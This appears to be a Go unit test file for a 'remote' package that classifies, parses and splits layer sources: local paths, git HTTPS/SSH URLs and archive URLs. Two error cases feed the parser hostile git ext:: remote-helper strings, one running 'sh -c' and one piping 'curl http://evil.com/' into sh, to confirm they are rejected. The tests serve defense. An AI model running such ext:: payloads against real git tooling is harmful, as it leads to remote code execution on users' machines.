package remote

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestClassify(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		segment string
		want    SourceType
	}{
		// Local paths
		{name: "absolute path", segment: "/absolute/path", want: SourceLocal},
		{name: "relative path", segment: "relative/path", want: SourceLocal},
		{name: "current dir", segment: ".", want: SourceLocal},
		{name: "parent dir", segment: "..", want: SourceLocal},
		{name: "glob path", segment: "layers/*", want: SourceLocal},
		{name: "path with dots", segment: "path/with.dots/layer", want: SourceLocal},
		{name: "empty string", segment: "", want: SourceLocal},
		{name: "single word", segment: "base", want: SourceLocal},

		// Git HTTPS
		{name: "git https dotgit", segment: "https://git.example.com/org/repo.git", want: SourceGit},
		{name: "git https dotgit with fragment", segment: "https://git.example.com/org/repo.git#main", want: SourceGit},
		{name: "git https dotgit with branch and path", segment: "https://git.example.com/org/repo.git#main:layers/base", want: SourceGit},
		{name: "git https dotgit in path", segment: "https://git.example.com/org/repo.git/info/refs", want: SourceGit},
		{name: "git http dotgit", segment: "http://git.example.com/org/repo.git", want: SourceGit},

		// Git SSH
		{name: "git ssh scp-style", segment: "git@git.example.com:org/repo.git", want: SourceGit},
		{name: "git ssh scp-style with fragment", segment: "git@git.example.com:org/repo.git#main:layers/base", want: SourceGit},
		{name: "git ssh protocol", segment: "ssh://git@host/org/repo.git", want: SourceGit},
		{name: "git ssh no dotgit", segment: "git@github.com:org/repo", want: SourceGit},

		// Archives
		{name: "archive tar.gz", segment: "https://example.com/layers.tar.gz", want: SourceArchive},
		{name: "archive tgz", segment: "https://example.com/layers.tgz", want: SourceArchive},
		{name: "archive zip", segment: "https://example.com/layers.zip", want: SourceArchive},
		{name: "archive tar.gz with path", segment: "https://example.com/path/to/layers.tar.gz", want: SourceArchive},

		// HTTPS without .git and not an archive -> SourceLocal (not a recognized remote pattern)
		{name: "plain https url", segment: "https://example.com/something", want: SourceLocal},
		{name: "http archive", segment: "http://example.com/layers.tar.gz", want: SourceArchive},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.want, Classify(tt.segment), "Classify(%q)", tt.segment)
		})
	}
}

func TestParse(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		segment string
		want    ParsedSource
		wantErr bool
		errMsg  string
	}{
		// Local paths
		{
			name:    "local absolute path",
			segment: "/absolute/path",
			want:    ParsedSource{Type: SourceLocal, Original: "/absolute/path"},
		},
		{
			name:    "local relative path",
			segment: "relative/path",
			want:    ParsedSource{Type: SourceLocal, Original: "relative/path"},
		},
		{
			name:    "empty string",
			segment: "",
			want:    ParsedSource{Type: SourceLocal, Original: ""},
		},

		// Git HTTPS - no fragment
		{
			name:    "git https no fragment",
			segment: "https://git.example.com/org/repo.git",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "https://git.example.com/org/repo.git",
				Original: "https://git.example.com/org/repo.git",
			},
		},
		// Git HTTPS - branch only
		{
			name:    "git https branch only",
			segment: "https://git.example.com/org/repo.git#main",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "https://git.example.com/org/repo.git",
				Branch:   "main",
				Original: "https://git.example.com/org/repo.git#main",
			},
		},
		// Git HTTPS - branch and path
		{
			name:    "git https branch and path",
			segment: "https://git.example.com/org/repo.git#main:layers/base",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "https://git.example.com/org/repo.git",
				Branch:   "main",
				SubPath:  "layers/base",
				Original: "https://git.example.com/org/repo.git#main:layers/base",
			},
		},
		// Git HTTPS - default branch with path
		{
			name:    "git https default branch with path",
			segment: "https://git.example.com/org/repo.git#:layers/base",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "https://git.example.com/org/repo.git",
				SubPath:  "layers/base",
				Original: "https://git.example.com/org/repo.git#:layers/base",
			},
		},
		// Git HTTPS - empty fragment (just #)
		{
			name:    "git https empty fragment",
			segment: "https://git.example.com/org/repo.git#",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "https://git.example.com/org/repo.git",
				Original: "https://git.example.com/org/repo.git#",
			},
		},
		// Git HTTPS - tag as branch
		{
			name:    "git https tag ref",
			segment: "https://git.example.com/org/repo.git#v2.1.0",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "https://git.example.com/org/repo.git",
				Branch:   "v2.1.0",
				Original: "https://git.example.com/org/repo.git#v2.1.0",
			},
		},
		// Git HTTPS - path with nested directories
		{
			name:    "git https nested subpath",
			segment: "https://git.example.com/org/repo.git#main:layers/security/base",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "https://git.example.com/org/repo.git",
				Branch:   "main",
				SubPath:  "layers/security/base",
				Original: "https://git.example.com/org/repo.git#main:layers/security/base",
			},
		},
		// Git SSH scp-style
		{
			name:    "git ssh scp-style no fragment",
			segment: "git@git.example.com:org/repo.git",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "git@git.example.com:org/repo.git",
				Original: "git@git.example.com:org/repo.git",
			},
		},
		{
			name:    "git ssh scp-style with fragment",
			segment: "git@git.example.com:org/repo.git#main:layers/base",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "git@git.example.com:org/repo.git",
				Branch:   "main",
				SubPath:  "layers/base",
				Original: "git@git.example.com:org/repo.git#main:layers/base",
			},
		},
		// Git SSH protocol
		{
			name:    "git ssh protocol",
			segment: "ssh://git@host/org/repo.git",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "ssh://git@host/org/repo.git",
				Original: "ssh://git@host/org/repo.git",
			},
		},
		{
			name:    "git ssh protocol with fragment",
			segment: "ssh://git@host/org/repo.git#develop:src",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "ssh://git@host/org/repo.git",
				Branch:   "develop",
				SubPath:  "src",
				Original: "ssh://git@host/org/repo.git#develop:src",
			},
		},

		// Archives
		{
			name:    "archive tar.gz",
			segment: "https://example.com/layers.tar.gz",
			want: ParsedSource{
				Type:     SourceArchive,
				RawURL:   "https://example.com/layers.tar.gz",
				Original: "https://example.com/layers.tar.gz",
			},
		},
		{
			name:    "archive tgz",
			segment: "https://example.com/layers.tgz",
			want: ParsedSource{
				Type:     SourceArchive,
				RawURL:   "https://example.com/layers.tgz",
				Original: "https://example.com/layers.tgz",
			},
		},
		{
			name:    "archive zip",
			segment: "https://example.com/layers.zip",
			want: ParsedSource{
				Type:     SourceArchive,
				RawURL:   "https://example.com/layers.zip",
				Original: "https://example.com/layers.zip",
			},
		},

		// Error cases
		{
			name:    "http archive rejected",
			segment: "http://example.com/layers.tar.gz",
			wantErr: true,
			errMsg:  "https",
		},
		{
			name:    "http git rejected",
			segment: "http://git.example.com/org/repo.git",
			wantErr: true,
			errMsg:  "https",
		},
		{
			name:    "ext:: remote helper rejected",
			segment: "ext::sh -c 'evil command'",
			wantErr: true,
			errMsg:  "ext::",
		},
		{
			name:    "ext:: with different payload",
			segment: "ext::curl http://evil.com/|sh",
			wantErr: true,
			errMsg:  "ext::",
		},

		// Trailing slash on git URL
		{
			name:    "git https trailing slash",
			segment: "https://git.example.com/org/repo.git/#main",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "https://git.example.com/org/repo.git/",
				Branch:   "main",
				Original: "https://git.example.com/org/repo.git/#main",
			},
		},

		// Git SSH without .git suffix
		{
			name:    "git ssh no dotgit suffix",
			segment: "git@github.com:org/repo",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "git@github.com:org/repo",
				Original: "git@github.com:org/repo",
			},
		},

		// Fragment with multiple colons (only first colon splits branch from path)
		{
			name:    "fragment with colon in subpath",
			segment: "https://git.example.com/org/repo.git#main:path/with:colon",
			want: ParsedSource{
				Type:     SourceGit,
				RawURL:   "https://git.example.com/org/repo.git",
				Branch:   "main",
				SubPath:  "path/with:colon",
				Original: "https://git.example.com/org/repo.git#main:path/with:colon",
			},
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got, err := Parse(tt.segment)
			if tt.wantErr {
				require.Error(t, err, "Parse(%q) should return error", tt.segment)
				if tt.errMsg != "" {
					assert.Contains(t, err.Error(), tt.errMsg)
				}
				return
			}
			require.NoError(t, err, "Parse(%q)", tt.segment)
			assert.Equal(t, tt.want, got, "Parse(%q)", tt.segment)
		})
	}
}

func TestSplitLayerSegments(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name  string
		input string
		want  []string
	}{
		// Basic local paths (unchanged behavior)
		{
			name:  "single local path",
			input: "local/path",
			want:  []string{"local/path"},
		},
		{
			name:  "two local paths",
			input: "local/a:local/b",
			want:  []string{"local/a", "local/b"},
		},
		{
			name:  "three local paths",
			input: "local/a:local/b:local/c",
			want:  []string{"local/a", "local/b", "local/c"},
		},
		{
			name:  "empty string",
			input: "",
			want:  nil,
		},
		{
			name:  "empty segments trimmed",
			input: "::a::",
			want:  []string{"a"},
		},
		{
			name:  "whitespace segments trimmed",
			input: "  :a:  ",
			want:  []string{"a"},
		},

		// HTTPS URLs
		{
			name:  "local then https git",
			input: "local/a:https://host/repo.git#main",
			want:  []string{"local/a", "https://host/repo.git#main"},
		},
		{
			name:  "local then https git with subpath",
			input: "local/a:https://host/repo.git#main:layers/base",
			want:  []string{"local/a", "https://host/repo.git#main:layers/base"},
		},
		{
			name:  "https git between two locals",
			input: "local/a:https://host/repo.git#main:layers/base:local/b",
			want:  []string{"local/a", "https://host/repo.git#main:layers/base", "local/b"},
		},
		{
			name:  "two https git urls",
			input: "https://host1/repo.git#main:path:https://host2/repo.git#dev",
			want:  []string{"https://host1/repo.git#main:path", "https://host2/repo.git#dev"},
		},
		{
			name:  "https archive",
			input: "local/a:https://example.com/layers.tar.gz",
			want:  []string{"local/a", "https://example.com/layers.tar.gz"},
		},
		{
			name:  "https git no fragment",
			input: "local/a:https://host/repo.git:local/b",
			want:  []string{"local/a", "https://host/repo.git", "local/b"},
		},

		// SSH URLs (git@host:org/repo.git)
		{
			name:  "local then ssh git",
			input: "local/path:git@host:org/repo.git#main:path",
			want:  []string{"local/path", "git@host:org/repo.git#main:path"},
		},
		{
			name:  "ssh git no fragment",
			input: "local/path:git@host:org/repo.git",
			want:  []string{"local/path", "git@host:org/repo.git"},
		},
		{
			name:  "ssh git with subpath fragment",
			input: "git@host:org/repo.git#main:layers/base",
			want:  []string{"git@host:org/repo.git#main:layers/base"},
		},
		{
			name:  "ssh git with subpath then local",
			input: "local/a:git@host:org/repo.git#main:layers/base:local/b",
			want:  []string{"local/a", "git@host:org/repo.git#main:layers/base", "local/b"},
		},
		{
			name:  "ssh protocol url",
			input: "local/a:ssh://git@host/org/repo.git#main:path",
			want:  []string{"local/a", "ssh://git@host/org/repo.git#main:path"},
		},

		// Mixed scenarios
		{
			name:  "all three types",
			input: "local/a:https://host/repo.git#main:layers/base:git@host2:org/repo2.git:local/b",
			want:  []string{"local/a", "https://host/repo.git#main:layers/base", "git@host2:org/repo2.git", "local/b"},
		},
		{
			name:  "single https url",
			input: "https://host/repo.git#main",
			want:  []string{"https://host/repo.git#main"},
		},
		{
			name:  "single ssh url",
			input: "git@host:org/repo.git",
			want:  []string{"git@host:org/repo.git"},
		},

		// Fragment edge cases
		{
			name:  "fragment with empty branch and path",
			input: "https://host/repo.git#:layers/base",
			want:  []string{"https://host/repo.git#:layers/base"},
		},
		{
			name:  "fragment with just hash",
			input: "https://host/repo.git#",
			want:  []string{"https://host/repo.git#"},
		},

		// Absolute paths
		{
			name:  "absolute paths colon separated",
			input: "/abs/a:/abs/b",
			want:  []string{"/abs/a", "/abs/b"},
		},

		// http:// URLs (still split correctly even though Parse will reject them)
		{
			name:  "http git url",
			input: "local/a:http://host/repo.git#main",
			want:  []string{"local/a", "http://host/repo.git#main"},
		},

		// SSH URL with no .git suffix
		{
			name:  "ssh no dotgit",
			input: "local/a:git@github.com:org/repo",
			want:  []string{"local/a", "git@github.com:org/repo"},
		},

		// Glob paths
		{
			name:  "glob path",
			input: "layers/*:https://host/repo.git#main",
			want:  []string{"layers/*", "https://host/repo.git#main"},
		},

		// Edge cases for looksLikeNewSegment
		{
			name:  "colon at end of URL fragment",
			input: "https://host/repo.git#main:path:",
			want:  []string{"https://host/repo.git#main:path:"},
		},
		{
			name:  "fragment with colon then git@ segment",
			input: "https://host/repo.git#main:sub:git@host2:org/repo2.git",
			want:  []string{"https://host/repo.git#main:sub", "git@host2:org/repo2.git"},
		},
		{
			name:  "ssh with colon then git@ segment",
			input: "git@host:org/repo.git#main:sub:git@host2:org/repo2.git",
			want:  []string{"git@host:org/repo.git#main:sub", "git@host2:org/repo2.git"},
		},
	}

	// Removed duplicate test case: "ssh git between locals" was identical to
	// "ssh git with subpath then local" (same input and expected output).

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.want, SplitLayerSegments(tt.input), "SplitLayerSegments(%q)", tt.input)
		})
	}
}

func TestSourceTypeString(t *testing.T) {
	t.Parallel()
	tests := []struct {
		st   SourceType
		want string
	}{
		{SourceLocal, "local"},
		{SourceGit, "git"},
		{SourceArchive, "archive"},
		{SourceType(99), "unknown"},
	}
	for _, tt := range tests {
		assert.Equal(t, tt.want, tt.st.String(), "SourceType(%d).String()", tt.st)
	}
}

func TestLooksLikeNewSegment(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		s    string
		want bool
	}{
		{name: "empty string", s: "", want: false},
		{name: "https URL", s: "https://host/repo.git", want: true},
		{name: "git@ scp", s: "git@host:org/repo.git", want: true},
		{name: "absolute path", s: "/absolute/path", want: true},
		{name: "relative path", s: "./relative", want: true},
		{name: "parent relative", s: "../parent", want: true},
		{name: "plain word", s: "something", want: true},
		{name: "ssh URL", s: "ssh://host/repo.git", want: true},
		{name: "http URL", s: "http://host/repo", want: true},
		{name: "bare directory", s: "subdir/file", want: true},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.want, looksLikeNewSegment(tt.s), "looksLikeNewSegment(%q)", tt.s)
		})
	}
}
